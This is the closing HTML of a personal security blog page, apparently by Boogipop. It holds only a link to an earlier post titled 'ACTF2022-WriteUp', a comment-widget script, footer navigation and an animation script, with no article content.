        <a href="/2023/04/02/ACTF2022%20_%20Web/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">ACTF2022-WriteUp</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>